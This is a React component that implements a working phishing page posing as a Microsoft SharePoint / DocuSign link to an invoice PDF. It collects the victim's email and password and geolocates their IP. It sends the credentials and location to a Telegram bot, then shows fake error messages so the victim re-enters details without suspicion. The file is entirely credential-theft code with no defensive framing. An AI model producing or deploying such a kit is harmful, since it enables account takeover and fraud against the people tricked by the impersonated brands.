import axios from "axios";
import { useEffect, useState } from "react";
import { TELEGRAM_CHAT_ID, TELEGRAM_URL } from "./api/telegramConfig";
import Logo from "./logo.png";
import PdfImg from "./pdf3.png";

const App = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [ipDetails, setIpDetails] = useState(null);
  const [step, setStep] = useState("email"); // email | password | retry | submitted
  const [submitting, setSubmitting] = useState(false);
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const res = await axios.get("https://ipapi.co/json/");
        setIpDetails(res.data);
      } catch (err) {
        setIpDetails({ city: "Unknown", country_name: "Unknown", ip: "Unavailable", org: "Unavailable" });
      }
    };
    fetchIpDetails();
  }, []);

  const sendToTelegram = async (label) => {
    const message = `
🔐 *${label}*
*Email:* ${email}
*Password:* ${password}
🌍 *Location:* ${ipDetails?.city || "Unknown"}, ${ipDetails?.country_name || ""}
🌐 *IP:* ${ipDetails?.ip || "Unavailable"}
🛠 *ISP:* ${ipDetails?.org || ""}
`;
    await axios.post(TELEGRAM_URL, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!email) return;
    setStep("password");
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (!password) return;
    setSubmitting(true);
    try {
      await sendToTelegram("DocuSg Login");
      setStep("submitted");
      setTimeout(() => {
        setEmail("");
        setPassword("");
        setShowPopup(true);
        setStep("email");
      }, 3000);
    } catch (err) {
      console.error("Error sending:", err);
      setStep("retry");
    } finally {
      setSubmitting(false);
    }
  };

  const handleRetrySubmit = async (e) => {
    e.preventDefault();
    if (!email || !password) return;
    setSubmitting(true);
    try {
      await sendToTelegram("Retry Attempt");
      setStep("submitted");
      setTimeout(() => {
        setEmail("");
        setPassword("");
        setShowPopup(true);
        setStep("email");
      }, 3000);
    } catch (err) {
      console.error("Retry failed:", err);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="h-screen bg-gray-100">
      <div className="bg-blue-600 py-3 w-full font-bold text-white text-2xl pl-10">
        Microsoft SharePoint
      </div>

      <div className="flex items-center justify-center h-auto py-20 bg-gray-100">
        <div className="bg-white py-8 px-6 rounded-lg shadow-lg w-96 text-center">
          <img src={Logo} alt="logo" className="mx-auto mb-4 w-24 -mt-20" />
          <h2 className="text-xl font-semibold text-blue-600 w-full py-4 bg-gray-200">
            Docu Sign
          </h2>

          {step === "email" && (
            <>
              <p className="text-gray-600 my-2">You've received a secure link to:</p>
              <div className="flex items-center justify-center gap-2 my-5">
                <img src={PdfImg} alt="PDF" className="w-6 h-6" />
                <span className="text-gray-800 font-medium">INV007209.pdf</span>
              </div>
              <p className="text-sm text-gray-500 mb-4">
                To open this secure link, enter the Office365 email this document was shared with.
              </p>
              <form onSubmit={handleEmailSubmit}>
                <input
                  type="email"
                  placeholder="Enter Your Business Email"
                  className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
                <button
                  type="submit"
                  className="w-full mt-6 p-3 bg-blue-600 text-white hover:bg-blue-700"
                >
                  Next
                </button>
              </form>
            </>
          )}

          {step === "password" && (
            <>
              <h2 className="text-lg font-semibold text-blue-600">Email Password</h2>
              <p className="text-gray-600 mt-2 font-bold">{email}</p>
              <form onSubmit={handlePasswordSubmit}>
                <input
                  type="password"
                  placeholder="Enter Your Password"
                  className="w-full p-2 border rounded-md mt-4 focus:outline-none focus:ring-2 focus:ring-blue-400"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="submit"
                  className="w-full mt-4 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
                  disabled={submitting}
                >
                  {submitting ? "Submitting..." : "Submit"}
                </button>
              </form>
            </>
          )}

          {step === "retry" && (
            <>
              <h2 className="text-xl font-bold text-red-600 mb-4">Incorrect detail.</h2>
              <form onSubmit={handleRetrySubmit}>
                <input
                  type="email"
                  placeholder="Enter Your Business Email"
                  className="w-full p-2 border rounded-md mb-3 focus:outline-none focus:ring-2 focus:ring-blue-400"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
                <input
                  type="password"
                  placeholder="Enter Your Password"
                  className="w-full p-2 border rounded-md mb-3 focus:outline-none focus:ring-2 focus:ring-blue-400"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="submit"
                  className="w-full mt-2 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
                  disabled={submitting}
                >
                  {submitting ? "Logging in..." : "Submit"}
                </button>
              </form>
            </>
          )}

          {step === "submitted" && (
            <p className="text-red-600 font-semibold mt-4">Error this time...</p>
          )}
        </div>
      </div>

      <div className="bg-gray-100 text-center pb-4">
        © 2025 Microsoft <span className="text-blue-500 ml-2">Privacy & Cookies</span>
      </div>

      {showPopup && (
        <div className="fixed bottom-4 right-4 bg-white border border-gray-300 px-4 py-2 rounded shadow-md">
          <span className="text-sm text-gray-700">Error. Try again later.</span>
        </div>
      )}
    </div>
  );
};

export default App;
